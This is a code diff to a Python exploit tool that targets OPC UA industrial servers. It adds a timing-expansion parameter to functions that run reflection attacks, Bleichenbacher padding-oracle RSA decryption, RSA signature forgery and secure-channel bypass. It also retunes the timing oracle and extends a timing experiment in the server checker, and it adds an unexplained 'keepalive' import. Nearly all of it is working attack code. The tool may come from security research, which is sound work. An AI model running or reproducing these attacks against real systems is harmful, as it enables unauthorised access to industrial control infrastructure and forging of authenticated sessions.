@@ -19,6 +19,7 @@ from decimal import Decimal
 from io import BytesIO
 
 import sys, os, itertools, re, math, hashlib, json, time, dataclasses
+import keepalive
 
 # Logging and errors.
 def log(msg : str):
@@ -425,7 +426,7 @@ def demonstrate_access(chan : ChannelState | str, authToken : NodeId, policy : S
   log('Finished browsing.') 
 
 # Reflection attack: log in to a server with its own identity.
-def reflect_attack(url : str, demo : bool, try_opn_oracle : bool, try_password_oracle : bool, cache_file : Path, timing_threshold : float):
+def reflect_attack(url : str, demo : bool, try_opn_oracle : bool, try_password_oracle : bool, cache_file : Path, timing_threshold : float, timing_expansion : int):
   proto, host, port = parse_endpoint_url(url)
   log(f'Attempting reflection attack against {url}')
   endpoints = get_endpoints(url)
@@ -446,12 +447,14 @@ def reflect_attack(url : str, demo : bool, try_opn_oracle : bool, try_password_o
   elif try_opn_oracle or try_password_oracle:
     tcp_eps = [ep for ep in endpoints if ep.securityPolicyUri != SecurityPolicy.NONE and ep.securityPolicyUri != SecurityPolicy.AES256_SHA256_RSAPSS and ep.transportProfileUri.endswith('uatcp-uasc-uabinary')]
     if tcp_eps:
+      # Decryption padding oracle is a bit faster when plaintext is already pkcs#1, so prefer that.
+      tcp_eps.sort(key=lambda ep: ep.securityPolicyUri != SecurityPolicy.BASIC128RSA15)
       target = tcp_eps[0]
       tproto, thost, tport = parse_endpoint_url(target.endpointUrl)
       assert tproto == TransportProtocol.TCP_BINARY
       
       log(f'No HTTPS endpoints. Trying to bypass secure channel on {target.endpointUrl} via padding oracle.')
-      chan = bypass_opn(target, target, try_opn_oracle, try_password_oracle, cache_file, timing_threshold)
+      chan = bypass_opn(target, target, try_opn_oracle, try_password_oracle, cache_file, timing_threshold, timing_expansion)
       log(f'Trying reflection attack (if channel is still alive).')
       try:
         token = execute_relay_attack(chan, target, chan, target)
@@ -713,8 +716,8 @@ class TimingBasedPaddingOracle(PaddingOracle):
     endpoint, 
     base_oracle : PaddingOracle,    # Padding oracle technique to use for timing when False is returned.
     timing_threshold : float = 0.5, # When processing takes longer than this many seconds, asumming correct padding.
-    verify_repeats : int = 5,       # How many times to repeat 'slow' query before confidence that padding is correct.
-    ctext_expansion : int = 100     # How many times bigger to repeat the ciphertext
+    ctext_expansion : int = 50,     # How many times bigger to repeat the ciphertext
+    verify_repeats : int = 2,       # How many times to repeat 'slow' query before confidence that padding is correct.
   ):
     super().__init__(endpoint)
     self._base = base_oracle
@@ -780,7 +783,6 @@ class TimingBasedPaddingOracle(PaddingOracle):
 # Carry out a padding oracle attack against a Basic128Rsa15 endpoint.
 # Result is ciphertext**d mod n (encoded big endian; any padding not removed).
 # Can also be used for signature forging.
-# Maybe TODO: optimizations from https://eprint.iacr.org/2012/417.pdf
 def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : bytes) -> bytes:  
   # Bleichenbacher's original attack: https://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf
   clen = len(ciphertext)
@@ -945,7 +947,7 @@ def padding_oracle_quality(
   return score * 100 // goodpads
 
 
-def find_padding_oracle(url : str, try_opn : bool, try_password : bool, timing_threshold : float) -> tuple[PaddingOracle, endpointDescription.Type]:
+def find_padding_oracle(url : str, try_opn : bool, try_password : bool, timing_threshold : float, timing_expansion : int) -> tuple[PaddingOracle, endpointDescription.Type]:
   # Try finding a working padding oracle against an endpoint.
   assert try_opn or try_password
   endpoints = get_endpoints(url)
@@ -975,7 +977,7 @@ def find_padding_oracle(url : str, try_opn : bool, try_password : bool, timing_t
           bestname, bestep, bestoracle, bestscore = oname, endpoint, oracle, quality
         elif quality == 0 and timing_threshold > 0:
           log(f'Base {oname} not working. Testing timing-based variant (threshold: {timing_threshold} seconds); this may take a minute.')
-          toracle = TimingBasedPaddingOracle(endpoint, oclass(endpoint), timing_threshold)
+          toracle = TimingBasedPaddingOracle(endpoint, oclass(endpoint), timing_threshold, timing_expansion)
           quality = padding_oracle_quality(endpoint.serverCertificate, toracle, 10, 100)
           log(f'Timing-based {oname} padding oracle score: {quality}/100')
           
@@ -999,11 +1001,11 @@ def find_padding_oracle(url : str, try_opn : bool, try_password : bool, timing_t
   else:
     raise AttackNotPossible(f'Can\'t find exploitable padding oracle.')
 
-def decrypt_attack(url : str, ciphertext : bytes, try_opn : bool, try_password : bool, timing_threshold : float):
+def decrypt_attack(url : str, ciphertext : bytes, try_opn : bool, try_password : bool, timing_threshold : float, timing_expansion : int):
   # Use padding oracle to decrypt a ciphertext.
   # Logs the result, and also tries parsing it.
   
-  oracle, endpoint = find_padding_oracle(url, try_opn, try_password, timing_threshold)
+  oracle, endpoint = find_padding_oracle(url, try_opn, try_password, timing_threshold, timing_expansion)
   
   log(f'Running padding oracle attack...')
   result = rsa_decryptor(oracle, endpoint.serverCertificate, ciphertext)
@@ -1056,7 +1058,7 @@ def decrypt_attack(url : str, ciphertext : bytes, try_opn : bool, try_password :
       except:
         pass
 
-def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_password : bool, policy : SecurityPolicy, timing_threshold : float) -> bytes:
+def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_password : bool, policy : SecurityPolicy, timing_threshold : float, timing_expansion : int) -> bytes:
   # Use padding oracle to forge an RSA PKCS#1 signature on some arbitrary payload.
   # Logs and returns signature.
   
@@ -1065,7 +1067,7 @@ def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_passw
     raise AttackNotPossible('Spoofing PSS signature is possible but currently not yet implemented.')
   
   hasher = 'sha1' if policy == SecurityPolicy.BASIC128RSA15 else 'sha256'
-  oracle, endpoint = find_padding_oracle(url, try_opn, try_password, timing_threshold)  
+  oracle, endpoint = find_padding_oracle(url, try_opn, try_password, timing_threshold, timing_expansion)  
   # Compute padded hash to be used as 'ciphertext'.
   sigsize = certificate_publickey(endpoint.serverCertificate).size_in_bytes()
   padhash = pkcs1v15_signature_encode(hasher, payload, sigsize)
@@ -1161,7 +1163,7 @@ def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):
     demonstrate_access(*chantoken, ep.securityPolicyUri)
     
 
-def forge_opn_request(impersonate_endpoint : endpointDescription.Type, login_endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool, timing_threshold : float) -> OpenSecureChannelMessage:
+def forge_opn_request(impersonate_endpoint : endpointDescription.Type, login_endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool, timing_threshold : float, timing_expansion : int) -> OpenSecureChannelMessage:
   # Use the padding oracle attack (against impersonate_endpoint) to forge a reusable signed and encrypted OPN request, that can be used against login_endpoint.  
   assert login_endpoint.securityPolicyUri != SecurityPolicy.NONE
   
@@ -1190,7 +1192,7 @@ def forge_opn_request(impersonate_endpoint : endpointDescription.Type, login_end
   login_pk = certificate_publickey(login_endpoint.serverCertificate)
   login_sp = login_endpoint.securityPolicyUri
   msg.sign_and_encrypt(
-    signer=lambda data: forge_signature_attack(impersonate_endpoint.endpointUrl, data, opn_oracle, password_oracle, login_sp, timing_threshold),
+    signer=lambda data: forge_signature_attack(impersonate_endpoint.endpointUrl, data, opn_oracle, password_oracle, login_sp, timing_threshold, timing_expansion),
     encrypter=lambda ptext: rsa_ecb_encrypt(login_sp, login_pk, ptext),
     plainblocksize=rsa_plainblocksize(login_sp, login_pk),
     cipherblocksize=login_pk.size_in_bytes(),
@@ -1200,7 +1202,7 @@ def forge_opn_request(impersonate_endpoint : endpointDescription.Type, login_end
   log(f'Message bytes after applying encryption: {hexlify(msg.to_bytes()).decode()}')
   return msg
   
-def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool, cache : Path, timing_threshold : float) -> ChannelState:
+def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool, cache : Path, timing_threshold : float, timing_expansion : int) -> ChannelState:
   lproto, lhost, lport = parse_endpoint_url(login_endpoint.endpointUrl)
   if lproto != TransportProtocol.TCP_BINARY:
     raise AttackNotPossible('Target endpoint should use opc.tcp protocol.')
@@ -1222,14 +1224,14 @@ def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint :
     opn_req = OpenSecureChannelMessage()
     opn_req.from_bytes(BytesIO(b64decode(cachedata[cachekey])))
   else:
-    opn_req = forge_opn_request(impersonate_endpoint, login_endpoint, opn_oracle, password_oracle, timing_threshold)
+    opn_req = forge_opn_request(impersonate_endpoint, login_endpoint, opn_oracle, password_oracle, timing_threshold, timing_expansion)
     log(f'Storing signed+encrypted OPN request in cache file {cache}.')
     cachedata[cachekey] = b64encode(opn_req.to_bytes()).decode()
     with cache.open('w') as outfile:
       json.dump(cachedata, outfile)
   
   log('Picking a padding oracle for decryption.')
-  oracle, oracle_ep = find_padding_oracle(impersonate_endpoint.endpointUrl, opn_oracle, password_oracle, timing_threshold)
+  oracle, oracle_ep = find_padding_oracle(impersonate_endpoint.endpointUrl, opn_oracle, password_oracle, timing_threshold, timing_expansion)
   
   log('Performing the OPN handshake...')
   login_sock = connect_and_hello(lhost, lport)
@@ -1294,7 +1296,7 @@ def server_checker(url : str, test_timing_attack : bool):
   log(f'Checking {url}...')
   endpoints = get_endpoints(url)
   encrypt_endpoints = [i for i, ep in enumerate(endpoints) if ep.securityMode == MessageSecurityMode.SIGN_AND_ENCRYPT]
-  log_success(f'{len(endpoints)} endpoints:')
+  log(f'{len(endpoints)} endpoints:')
   findings = []
   pkcs1_ep = None
   
@@ -1354,42 +1356,57 @@ def server_checker(url : str, test_timing_attack : bool):
       log('No endpoint with Basic128Rsa15. Can\'t test timing attack.')
     else:
       log('Testing OpenSecureChannel timing attack...')
-      keylen = certificate_publickey(pkcs1_ep.serverCertificate).size_in_bytes()
-      n, e = certificate_publickey_numbers(pkcs1_ep.serverCertificate)
-      okpads = 50
-      nokpads = 50
-      ok_time = 0
-      nok_time = 0
-      minok = math.inf
-      maxnok = 0
-      for i, (padding_ok, plaintext) in enumerate(padding_oracle_testinputs(keylen, n, okpads, nokpads), start=1):
-        inputval = int2bytes(pow(plaintext, e, n), keylen) * 100
-        oracle = OPNPaddingOracle(pkcs1_ep)
-        oracle._setup()
-        starttime = time.time()
-        try:
-          oracle._attempt_query(inputval)
-        except:
-          pass
-        duration = time.time() - starttime
-        
-        log(f'Test {i}: {"good" if padding_ok else "bad"} padding; time: {duration}')
-        if padding_ok:
-          ok_time += duration
-          minok = min(duration, minok)
-        else:
-          nok_time += duration
-          maxnok = max(duration, maxnok)
-        
-        try:
-          oracle._cleanup()
-        except:
-          pass
+      results = {}
+      for expandval in [30,50,100]:
+        log(f'Expansion parameter {expandval}:')
+        keylen = certificate_publickey(pkcs1_ep.serverCertificate).size_in_bytes()
+        n, e = certificate_publickey_numbers(pkcs1_ep.serverCertificate)
+        okpads = 50
+        nokpads = 50
+        ok_time = 0
+        nok_time = 0
+        minok = math.inf
+        maxnok = 0
+        for i, (padding_ok, plaintext) in enumerate(padding_oracle_testinputs(keylen, n, okpads, nokpads), start=1):
+          inputval = int2bytes(pow(plaintext, e, n), keylen) * expandval
+          oracle = OPNPaddingOracle(pkcs1_ep)
+          oracle._setup()
+          starttime = time.time()
+          try:
+            oracle._attempt_query(inputval)
+          except:
+            pass
+          duration = time.time() - starttime
           
-      log_success(f'Average time with correct padding: {ok_time / okpads}')
-      log_success(f'Shortest time with correct padding: {minok}')
-      log_success(f'Average time with incorrect padding: {nok_time / nokpads}')
-      log_success(f'Longest time with incorrect padding: {maxnok}')
+          log(f'Test {i}: {"good" if padding_ok else "bad"} padding; time: {duration}')
+          if padding_ok:
+            ok_time += duration
+            minok = min(duration, minok)
+          else:
+            nok_time += duration
+            maxnok = max(duration, maxnok)
+          
+          try:
+            oracle._cleanup()
+          except:
+            pass
+        
+        results[expandval] = {
+          'avgok': ok_time / okpads,
+          'minok': minok,
+          'avgnok': nok_time / nokpads,
+          'maxnok': maxnok
+        }
+        log('-----------------')
+          
+      log('Timing experiment results:')
+      for expandval, result in results.items():
+        log_success(f'Expansion parameter {expandval}:')
+        log_success(f'Average time with correct padding: {result["avgok"]}')
+        log_success(f'Shortest time with correct padding: {result["minok"]}')
+        log_success(f'Average time with incorrect padding: {result["avgnok"]}')
+        log_success(f'Longest time with incorrect padding: {result["maxnok"]}')
+        log_success('-----------------')
 
 
 def auth_check(url : str, skip_none : bool, demo : bool):
